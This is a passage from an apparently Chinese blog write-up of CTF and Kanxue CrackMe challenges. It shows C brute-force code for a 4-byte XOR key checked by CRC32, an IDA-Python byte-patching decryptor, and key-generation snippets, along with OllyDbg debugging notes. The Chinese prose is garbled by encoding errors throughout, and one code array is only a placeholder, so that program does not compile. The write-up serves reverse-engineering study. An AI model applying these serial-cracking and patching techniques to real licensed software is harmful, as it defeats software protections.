class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hash_table[<span class="number">0x401</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401500</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; </span><br><span class="line">  <span class="keyword">int</span> *v2; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; </span><br><span class="line"></span><br><span class="line">  hash_table[<span class="number">0x400</span>] = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0x0EDB88320</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = hash_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = v1;</span><br><span class="line">    result = v1;</span><br><span class="line">    v4 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ((result &amp; <span class="number">1</span>) != <span class="number">0</span> ? v0 : <span class="number">0</span>) ^ (result &gt;&gt; <span class="number">1</span>);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    *v2 = result;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_code</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  a3 ^= <span class="number">0xD9EE7A1B</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(result + a1) ^= *((<span class="keyword">char</span> *)&amp;a3 + (result &amp; <span class="number">3</span>));</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401550</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = ~a1; v3 &lt; a3; ++v3 )</span><br><span class="line">    i = hash_table[(<span class="keyword">unsigned</span> __int8)i ^ *(<span class="keyword">unsigned</span> __int8 *)(v3 + a2)] ^ (i &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;<span class="number">0x402010</span><span class="number">-0x402AC0</span>çš„æ•°æ®&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0x30303030</span>, e = <span class="number">0x7a7a7a7a</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> decode_data[<span class="number">0xAB0</span>];</span><br><span class="line"><span class="keyword">clock_t</span> start, <span class="built_in">end</span>, total;</span><br><span class="line"> </span><br><span class="line">start = clock();</span><br><span class="line">sub_401500();</span><br><span class="line"><span class="keyword">for</span>(i = s; i &lt;= e; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)&amp;i;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &lt; <span class="number">48</span> || a[<span class="number">1</span>] &lt; <span class="number">48</span> || a[<span class="number">2</span>] &lt; <span class="number">48</span> || a[<span class="number">3</span>] &lt; <span class="number">48</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">65</span>) || (a[<span class="number">1</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">65</span>) || </span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">65</span>) || (a[<span class="number">3</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">65</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">97</span>) || (a[<span class="number">1</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">97</span>) ||</span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">97</span>) || (a[<span class="number">3</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">97</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">122</span> || a[<span class="number">1</span>] &gt; <span class="number">122</span> || a[<span class="number">2</span>] &gt; <span class="number">122</span> || a[<span class="number">3</span>] &gt; <span class="number">122</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(decode_data, ida_chars, <span class="number">0xAB0</span>); </span><br><span class="line">decode_code(decode_data, <span class="number">0xAB0</span>, i);</span><br><span class="line"><span class="keyword">if</span>(sub_401550(<span class="number">0</span>, decode_data, <span class="number">0xAB0</span>) == <span class="number">0xAFFE390F</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">end</span> = clock();</span><br><span class="line">total = (<span class="built_in">end</span>-start)/CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"çˆ†ç ´æ‰€ç”¨æ—¶é—´ï¼š%dåˆ†:%dç§’\n"</span>, total/<span class="number">60</span>, total%<span class="number">60</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æŒºå¿«å°±å¾—åˆ°äº†ç­”æ¡ˆï¼Œä¸»è¦æ˜¯è¦ä¼˜åŒ–å»é™¤ä¸å¯èƒ½çš„å­—ç¬¦ã€‚<img src="/2020/07/31/CrackMe/image-20200813135150617.png" alt="image-20200813135150617"></p><p>ä»¥ä¸ºåˆ°è¿™é‡Œåº”è¯¥å°±ç»“æŸäº†ï¼Œè§£å¯†å‡ºçš„ä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•çš„å¯¹keyä¸nameåˆ¤æ–­ï¼Œç®—æ³•ä¼šå¾ˆç®€å•ã€‚æ˜¯æˆ‘æƒ³å¤šäº†ğŸ¤£ï¼Œè¯´èµ·è¿™ä¸ªç®—æ³•æˆ‘å°±æ˜¯ç—›ï¼ŒèŠ±äº†å¥½å¤šæ—¶é—´åŠ¨è°ƒçŒœæµ‹ä¸€äº›å‡½æ•°çš„ä½œç”¨ï¼Œä¼ªä»£ç å®åœ¨ä¸å¥½çœ‹ï¼Œä¹Ÿä¸æƒ³çœ‹äº†ï¼Œæ±‡ç¼–å°±ä¸è¯´äº†ã€‚ã€‚</p><p><strong>å¼€å§‹è¿›å…¥è§£å¯†éƒ¨åˆ†</strong></p><p>å†™ida-pythonè„šæœ¬å¯¹<strong>00402010</strong>å¼€å§‹çš„ä»£ç è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x402010</span></span><br><span class="line">s = [<span class="number">89</span>, <span class="number">63</span>, <span class="number">-85</span>, <span class="number">-97</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xab0</span>):</span><br><span class="line">    PatchByte(addr+i, (Byte(addr+i)^s[i&amp;<span class="number">3</span>])&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>æ¥åˆ°è§£å¯†åçš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200813141328038.png" alt="image-20200813141328038"></p><p>ç”±äºæœ€åè¦nameè®¡ç®—å‡ºçš„æ•´æ•°ä¸keyè®¡ç®—å‡ºçš„æ•´æ•°ç›¸ç­‰ï¼Œè€Œnameè®¡ç®—å‡ºçš„æ•´æ•°åœ¨ODçš„å†…å­˜ä¸­åå…­è¿›åˆ¶å­˜æ”¾ï¼Œè¿™æ˜¯å¯ä»¥çœ‹åˆ°çš„ã€‚è€Œkeyè®¡ç®—å‡ºæ•°æ®æ—¶ä¹Ÿæ˜¯ä¾æ¬¡å¾—åˆ°æ•°æ®çš„æ¯ä¸€ä½ï¼Œç„¶å*16è½¬åŒ–ä¸€ä¸ªæ•´æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦è®©keyè®¡ç®—å‡ºçš„æ¯ä¸€ä½ä¸nameè®¡ç®—åçš„æ•°æ®çš„æ¯ä¸€ä½ç›¸ç­‰å³å¯ã€‚ä¸”16è¿›åˆ¶æ•°åªæœ‰â€œ0123456789ABCDEFâ€è¿™äº›æ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå¾—åˆ°ä¸€å¼ è¿™æ ·çš„æ˜ å°„è¡¨ã€‚</p><p>æ¨¡æ‹Ÿsub_4021A0ä¸sub_402A40å‡½æ•°å¾—åˆ°è¡¨ï¼š<strong>è¿™é‡Œæˆ‘å¯¹sub_402A40è¿›è¡Œäº†ç®€åŒ–ï¼Œå› ä¸ºåªæœ‰0-Fçš„æ•°å­—ï¼Œæ‰€ä»¥åªæœ‰è¿™å‡ ä¸ªå°æ­£æ•°æƒ…å†µã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i^<span class="number">0x86</span>)<span class="number">-48</span>) == j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#123;%#X"</span>, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", %#X"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144333400.png" alt="image-20200813144333400"></p><p>æœ€åæˆ‘ä»¥è®¡ç®—nameä¸ºBxbçš„keyï¼Œäº‹å…ˆå¾—åˆ°äº†Bxbè®¡ç®—å‡ºçš„æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"1D702A7304A94"</span>;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0XB6</span>, <span class="number">0XB7</span>, <span class="number">0XB4</span>, <span class="number">0XB5</span>, <span class="number">0XB2</span>, <span class="number">0XB3</span>, <span class="number">0XB0</span>,</span><br><span class="line">   <span class="number">0XB1</span>, <span class="number">0XBE</span>, <span class="number">0XBF</span>, <span class="number">0XBC</span>, <span class="number">0XBD</span>, <span class="number">0XBA</span>, <span class="number">0XBB</span>, <span class="number">0XB8</span>, <span class="number">0XB9</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"BEEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = s[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt;= <span class="number">48</span> &amp;&amp; temp &lt;= <span class="number">57</span>)</span><br><span class="line">temp -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">temp -= <span class="number">55</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(flag+i*<span class="number">2</span>+<span class="number">4</span>, <span class="string">"%X"</span>, a[temp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144918630.png" alt="image-20200813144918630"></p><p>åšåˆ°è¿™ï¼ŒçœŸçš„ä¸æƒ³å†çœ‹è¿™ä¸ªé¢˜äº†ï¼Œæˆ‘å°±æƒ³ä¸é€šï¼Œä¼ªä»£ç æ€ä¹ˆå¦‚æ­¤ç»•ï¼Œkeyçš„ç”Ÿæˆç®—æ³•éƒ½åŠ¨è°ƒäº†å¥½å¤šéã€‚æ‰€ä»¥é‚£ä¸ªnameè®¡ç®—çš„ç®—æ³•ä¹ŸçœŸçš„ä¸æƒ³çœ‹äº†ã€‚ã€‚ã€‚è¿›è€Œä¸èƒ½å¾—åˆ°æ³¨å†Œæœºã€‚</p><p>å…¶æ¬¡è¿™ä¸ªé¢˜ï¼Œå¯¹è¦æ”¹å˜æ•°æ®çš„å†…å­˜åœ°å€ï¼Œä¼ å‚éƒ½æ˜¯ä½¿ç”¨ecxä¼ å‚æŒ‡å‘this*ã€‚</p><h2 id="ä¹˜é£ç ´æµª"><a href="#ä¹˜é£ç ´æµª" class="headerlink" title="ä¹˜é£ç ´æµª"></a>ä¹˜é£ç ´æµª</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>é¢˜ç›®éš¾ç‚¹ï¼šé¢˜ç›®å¼€å§‹å¯åŠ¨åŒçº¿ç¨‹ï¼Œçº¿ç¨‹ä¹‹é—´ä»¥äº‹ä»¶é€šè®¯ã€‚å¯¹äºä¸æ¸…æ¥šåŒçº¿ç¨‹ï¼Œè‡ªç„¶ä¼šæœ‰å¾ˆå¤šç–‘é—®ï¼Œè·Ÿè¸ªç¨‹åºèµ·æ¥ä¹Ÿä¼šå›°éš¾ä¸€äº›ã€‚</p><p>é¦–å…ˆä»¥ä¸çŸ¥é“åŒçº¿ç¨‹çš„è§’åº¦æ¥è·Ÿè¸ªç¨‹åºï¼š</p><p>æŸ¥çœ‹ç¨‹åºä¸­çš„è·å–æ§ä»¶æ–‡æœ¬å†…å®¹çš„APIï¼Œæœç´¢å‘ç°æ²¡æœ‰GetDlgItemTextï¼Œä½†æ˜¯æœ‰GetWindowTextLenthWä¸GetWindowTextWã€‚åŒå‡»è¿›å…¥ã€‚<img src="/2020/07/31/CrackMe/image-20200731174647264.png" alt="image-20200731174647264"></p><p>ç”±äºåé¢è‚¯å®šä¼šå¯¹è¾“å…¥æ•°æ®è¿›è¡ŒéªŒè¯å¤„ç†ï¼Œæ‰€ä»¥åœ¨æ•°æ®çª—å£å¯¹è¯¥åœ°å€ä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹, F9è¿è¡Œæ–­ä¸‹åï¼š<img src="/2020/07/31/CrackMe/image-20200731175348583.png" alt="image-20200731175348583"></p><p>ä¸Šé¢æ±‡ç¼–ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯æ¯”è¾ƒè¾“å…¥çš„nameä¸keyæ˜¯å¦ç›¸ç­‰ä¸”æœ€åä»¥è¿™ä¸ªæ¥ç¡®å®šè¿”å›å€¼ï¼Œå°è¯•æ‰“å¼€ç¨‹åºçœ‹éªŒè¯ä¸€ä¸‹ï¼Œä¸å¯¹çš„ã€‚ç»§ç»­è·Ÿç€ç¨‹åºè¿”å›ï¼šæ—¢ç„¶ä¸Šä¸€ä¸ªéªŒè¯å‡½æ•°æ˜¯é”™è¯¯çš„ï¼Œä¸‹é¢è¿™ä¸ªç®­å¤´æ‰€æŒ‡è·³è½¬å°±ä¸èƒ½å®ç°æ‰æ­£ç¡®ã€‚<img src="/2020/07/31/CrackMe/image-20200731175649160.png" alt="image-20200731175649160"></p><p>ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨åï¼Œå•æ­¥åˆ†æ401299ä»¥ä¸‹çš„ä»£ç ï¼Œå¾ˆå¤šæ— ç”¨çš„è·³è½¬ï¼Œè¿˜æ˜¯ç®€å•ï¼Œä¸€ä¸ªéªŒè¯ï¼šnameä¸keyçš„é€†åºæ˜¯å¦ç›¸ç­‰ä¸”é•¿åº¦è¦ä¸å°äº8ã€‚å†æ¬¡æ‰“å¼€ç¨‹åºéªŒè¯ä¸€ä¸‹ï¼Œæ­£ç¡®ã€‚æ‰€ä»¥ç¨‹åºçš„keyåªè¦æ˜¯nameçš„é€†åºå°±æ­£ç¡®ã€‚</p><p>å½“ç„¶æˆ‘å¯¹ç¨‹åºè¿˜æ˜¯æœ‰å¾ˆå¤šç–‘é—®ï¼Œä»å‡ºé¢˜äººçš„å¸–å­çœ‹åˆ°è¯´æ˜¯åŒçº¿ç¨‹ã€‚</p><p>å¼€å§‹å»å­¦ä¹ å¤šçº¿ç¨‹çš„çŸ¥è¯†ï¼Œè§‰å¾—è®²çš„å¾ˆæ¸…æ¥šçš„ä¸€ä¸ªå¸–å­ï¼š<a href="https://blog.csdn.net/LL596214569/article/details/89163734" target="_blank" rel="noopener">https://blog.csdn.net/LL596214569/article/details/89163734</a></p><p>äº†è§£å¤šçº¿ç¨‹åï¼Œç†è§£è¿™ä¸ªç¨‹åºå°±å¾ˆå¥½äº†ï¼Œé¦–å…ˆæ˜¯çœ‹æ˜¯å¦æœ‰åˆ›å»ºäº‹ä»¶ï¼ŒæŸ¥æ‰¾APIï¼šCreatEventã€‚åœ¨åˆ›å»ºçº¿ç¨‹APIï¼šCreatThreadä¸‹æ–­ç‚¹ï¼Œä»CreatThreadæ‰¾åˆ°çº¿ç¨‹å‡½æ•°çš„åœ°å€ã€‚æ¥ç€å°±æ˜¯ä¸‹å›¾ä¸­çš„å‡½æ•°ï¼š<img src="/2020/07/31/CrackMe/image-20200731182155636.png" alt="image-20200731182155636"></p><p><strong>æœ€å</strong>ï¼Œæ‰€ä»¥ç¨‹åºçš„æ•´ä½“é€»è¾‘å°±æ˜¯é¦–å…ˆåˆ›å»º2ä¸ªäº‹ä»¶ï¼Œå†åˆ›å»º2ä¸ªçº¿ç¨‹ï¼Œ2ä¸ªçº¿ç¨‹å‡½æ•°éƒ½æœ‰WaitForSingleObjectå‡½æ•°ä¸€ç›´ç­‰å¾…äº‹ä»¶çš„ä¿¡å·åå†å‘ä¸‹ç»§ç»­æ‰§è¡Œã€‚è€Œæˆ‘ä»¬è¾“å…¥nameä¸keyåç‚¹å‡»Okå°±ä¼šå‘ç”ŸæŒ‰é’®äº‹ä»¶ï¼Œè§¦å‘OSå‘ç¨‹åºå‘ç°æ¶ˆæ¯ï¼Œç„¶åæ‰§è¡ŒSetEventå‡½æ•°å°†æŒ‡å®šçº¿ç¨‹çš„WaitForSingleObjectå‡½æ•°ç­‰å¾…çš„æŒ‡å®šäº‹ä»¶è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ã€‚<img src="/2020/07/31/CrackMe/image-20200731183904491.png" alt="image-20200731183904491"></p><p>æ¥ä¸‹æ¥åœ¨è¯¥çº¿ç¨‹è¿›è¡ŒéªŒè¯nameä¸keyï¼Œå¦‚æœéªŒè¯é€šè¿‡çš„è¯è®¾ç½®å¦å¤–ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…çš„æŒ‡å®šçš„äº‹ä»¶è®¾ç½®ä¸ºæœ‰ä¿¡å·çŠ¶æ€ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¼€å§‹æ‰§è¡Œæ˜¾ç¤ºæç¤ºæ­£ç¡®çš„å¯¹è¯æ¡†çš„ä»£ç ã€‚<strong>ç®€è€Œè¨€ä¹‹ï¼šä¸€ä¸ªçº¿ç¨‹è´Ÿè´£éªŒè¯ï¼Œä¸€ä¸ªçº¿ç¨‹è´Ÿè´£æ˜¾ç¤ºã€‚</strong></p><h2 id="æ¸å…¥ä½³å¢ƒ"><a href="#æ¸å…¥ä½³å¢ƒ" class="headerlink" title="æ¸å…¥ä½³å¢ƒ"></a>æ¸å…¥ä½³å¢ƒ</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œæœ‰é”™è¯¯è¾“å…¥æç¤ºæ¡†ã€‚</p><p>ä¸Šæ‰‹ç›´æ¥æ‰¾MessageBoxï¼Œåˆ°è¾¾ä»£ç å¤„å‘ä¸Šåˆ†æï¼šæ‰€ä»¥æˆ‘ä»¬è¦å‘ä¸Šå›æº¯æ‰¾åˆ°å¯¹ebp+cèµ‹å€¼å¤„ã€‚<img src="/2020/07/31/CrackMe/image-20200801132230026.png" alt="image-20200801132230026"></p><p>ç»§ç»­å‘ä¸Šå›æº¯å¯ä»¥çœ‹åˆ°ï¼š<img src="/2020/07/31/CrackMe/image-20200801132543497.png" alt="image-20200801132543497"></p><p>æ‰€ä»¥ä¸‹é¢è·³è½¬çš„åœ°æ–¹å°±æ˜¯éªŒè¯è¿‡ç¨‹ï¼šç®—æ³•å¾ˆç®€å•ã€‚<img src="/2020/07/31/CrackMe/image-20200801132628646.png" alt="image-20200801132628646"></p><h2 id="CrackMe01"><a href="#CrackMe01" class="headerlink" title="CrackMe01"></a>CrackMe01</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªâ€œç™¾åº¦æ¯â€CTFæ¯”èµ›åä¸€æœˆåœº</p><p>è¿˜æ˜¯ä¸Šæ‰‹è½½å…¥ODï¼Œæ‰¾ä¸€ä¸‹è·å–è¾“å…¥æ–‡æœ¬ç›¸å…³çš„APIï¼š<img src="/2020/07/31/CrackMe/image-20200805164512873.png" alt="image-20200805164512873"></p><p>å¼€å§‹åªçœ‹åˆ°ç¬¬ä¸€ä¸ªï¼Œä¸‹æ–­ååœ¨ç¨‹åºè¾“å…¥å†…å®¹åå´æ²¡æœ‰æ–­ä¸‹ã€‚è¿˜ä»¥ä¸ºåˆæ˜¯å¤šçº¿ç¨‹ï¼Œåˆ†æä¸€æ³¢åç¡®å®åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œä½†ä¸å¯¹ã€‚åé¢æ‰åœ¨ç¬¬äºŒä¸ªGetWindowTextWä¸‹æ–­ï¼Œè¾“å…¥å†…å®¹åç¨‹åºæ–­ä¸‹ã€‚</p><p>å•æ­¥è·Ÿè¸ªåå‘ç°ï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¼ åˆ°å¦å¤–ä¸€ä¸ªå†…å­˜ç©ºé—´å­˜å‚¨åï¼Œå†è°ƒç”¨PostMessageWå‡½æ•°å°†è¾“å…¥å­—ç¬¦ä¼ ç»™æŒ‡å®šå¥æŸ„çš„çª—å£ã€‚è¿™é‡Œæ‰“å¼€idaçœ‹ä¸‹ï¼š<img src="/2020/07/31/CrackMe/image-20200805170315887.png" alt="image-20200805170315887"></p><p>ä¹‹åå¯ä»¥ç›´æ¥æŸ¥æ‰¾é»˜è®¤æ¶ˆæ¯å¤„ç†å‡½æ•°ï¼šDefWindowProc æ¥å®šä½å¤„ç†è¾“å…¥å­—ç¬¦çš„ä»£ç å¤„ã€‚</p><p>è¿™é‡Œçœ‹PostMessageå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°çš„äº¤å‰å¼•ç”¨æ¥å®šä½ç›®çš„ä»£ç ã€‚å› 